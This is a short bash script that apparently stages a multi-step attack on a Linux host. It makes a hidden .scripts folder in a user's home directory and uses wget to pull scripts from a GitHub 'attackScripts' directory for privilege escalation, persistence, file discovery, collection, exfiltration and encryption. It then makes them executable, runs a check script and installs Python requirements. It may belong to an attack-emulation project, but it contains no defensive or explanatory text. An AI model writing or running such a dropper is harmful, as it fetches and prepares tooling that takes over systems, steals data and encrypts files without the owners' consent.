#!/bin/bash
cd /home/resch
# Create hidden folder
mkdir .scripts
cd /home/resch/.scripts
#PE
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/PEexploit.sh
# Persistence
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/persistence1.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/persistence2.sh
# File discovery
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/file_and_dir_discovery.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/file_and_dir_discovery-stripped.sh
# Collection
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/collectiontarget.sh
# Exfiltration
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_target.sh
# Encryption
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/check.sh
# Chmod execute
chmod -R +x /home/resch/.scripts
# Other files
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/requirements.txt
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/encrypt.py
# Install requirements
./check.sh
pip3 install -r ./requirements.txt

